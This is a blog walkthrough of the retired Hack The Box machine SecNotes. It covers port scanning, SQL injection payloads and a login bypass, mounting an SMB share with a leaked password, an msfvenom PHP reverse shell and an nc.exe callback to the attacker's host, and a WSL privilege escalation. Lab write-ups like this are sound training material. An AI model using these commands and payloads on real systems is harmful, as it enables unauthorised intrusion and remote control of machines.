@@ -1,0 +1,217 @@
+
+
+SecNotes: Hack The Box Walkthrough
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+20 Jan 2019
+
+
+
+5 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of SecNotes, a retired vulnerable VM created by 0xdf, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+SecNotes is a retired vulnerable VM from Hack The Box.
+Information Gathering
+Letâs start with a masscan probe to establish the open ports in the host.
+# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-19 03:49:54 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 445/tcp on 10.10.10.97                                    
+Discovered open port 80/tcp on 10.10.10.97                                     
+Discovered open port 8808/tcp on 10.10.10.97
+
+Iâll do one better with nmap scanning the discovered open ports.
+# nmap -n -v -Pn -p80,445,8808 -A --reason -oN nmap.txt 10.10.10.97
+...
+PORT     STATE SERVICE      REASON          VERSION
+80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+8808/tcp open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+...
+Host script results:
+|_clock-skew: mean: 2h40m01s, deviation: 4h37m09s, median: 0s
+| smb-os-discovery:
+|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES\x00
+|   Workgroup: HTB\x00
+|_  System time: 2019-01-18T19:53:32-08:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-01-19 03:53:30
+|_  start_date: N/A
+
+Itâs a Windows box alright. But, letâs go with the http services: 80/tcp and 8808/tcp. This is how they look like.
+
+
+
+
+
+
+Notice the login page allows new sign up? Letâs go ahead and open Burp, and sign up a dick user for ourselves.
+
+
+
+Login time.
+
+
+
+Itâs obvious that user tyler is present in the system. If we re-login with tyler, this is what happens.
+
+
+
+2nd-order SQL Injection
+Hmm. Letâs use wfuzz to inject common SQL injection strings into the registration page just to see what we get. Here, Iâm soliciting 200 responses to see whatâs going on with the registration. Typically, a successful registration will return a 302 response.
+# wfuzz -w /usr/share/wfuzz/wordlist/Injections/SQL.txt -t 20 --sc 200 -d "username=dickFUZZ&amp;password=password&amp;confirm_password=password" http://10.10.10.97/register.php
+
+********************************************************
+* Wfuzz 2.3.3 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.97/register.php
+Total requests: 125
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000083:  C=200     40 L      116 W         1689 Ch        "t'exec master..xp_cmdshell 'nslookup www.google.com'--"
+000096:  C=200     40 L      115 W         1643 Ch        "%27%20or%201=1"
+000100:  C=200     40 L      110 W         1625 Ch        "&amp;apos;%20OR"
+000105:  C=200     40 L      113 W         1637 Ch        "*|"
+000104:  C=200     40 L      113 W         1636 Ch        "%7C"
+000107:  C=200     40 L      113 W         1647 Ch        "*(|(mail=*))"
+000109:  C=200     40 L      113 W         1654 Ch        "*(|(objectclass=*))"
+000113:  C=200     40 L      113 W         1636 Ch        ")"
+000115:  C=200     40 L      110 W         1625 Ch        "&amp;"
+000112:  C=200     40 L      113 W         1636 Ch        "%28"
+000119:  C=200     40 L      110 W         1625 Ch        "' or 1=1 or ''='"
+000117:  C=200     40 L      113 W         1636 Ch        "!"
+000120:  C=200     40 L      110 W         1625 Ch        "' or ''='"
+
+Total time: 24.13528
+Processed Requests: 125
+Filtered Requests: 112
+Requests/sec.: 5.179139
+
+Long story short, I tried all the payloads and ' or 1=1 or ''=' manage bypass the login and display the following notes. 
+
+
+
+Itâs the credentials thatâs interesting!
+
+
+
+Armed with this new information, we can mount the file share.
+New Site
+We can mount the file share with mount of course.
+# mount -t cifs -o username=tyler,password='92g!mA8BGjOirkL%OG*&amp;',uid=0,gid=0 //10.10.10.97/new-site /mnt/secnotes/new-site
+
+What do we have here?
+
+
+
+Appears to be the wwwroot of the other http service: 8808/tcp. And since the site is running PHP, letâs copy a reverse shell written in PHP over to the new site. We can generate the reverse shell with msfvenom like so.
+# msfvenom -p php/reverse_php LHOST=10.10.12.9 LPORT=1234 -o rev.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 3004 bytes
+Saved as: rev.php
+
+Visit http://10.10.10.97:8808/rev.php.
+
+
+
+Meanwhile at my nc listenerâ¦
+
+
+
+Awesome, but the reverse shell is pretty unstable. We need a resilient shell to conduct further enumeration.
+Letâs transfer a nc for Windows over. If you are using Kali Linux, itâs at /usr/share/windows-binaries/nc.exe.
+Now, once the PHP reverse shell connects back, launch nc.exe to connect back to me at a different port, say 4321/tcp.
+
+
+
+
+
+
+user.txt is at tylerâs desktop.
+
+
+
+Privilege Escalation
+During enumeration of tylerâs account, I notice a shortcut (LNK) pointing to bash.exe at the Windows System32 directory.
+
+
+
+Furthermore, \Distros\Ubuntu\ubuntu.exe is present too.
+
+
+
+This led me to believe Windows Subsystem for Linux (WSL) is installed. Perhaps bash.exe is around somewhere as well?
+
+
+
+Sweet. Letâs copy that to tylerâs desktop and launch bash.exe -i.
+
+
+
+What do you know? Iâm root! Man, Iâm like a duck to water in the Linux environment.
+
+
+
+Armed with the administrator password, we can now mount the C$ volume and access root.txt.
+
+
+
+
+
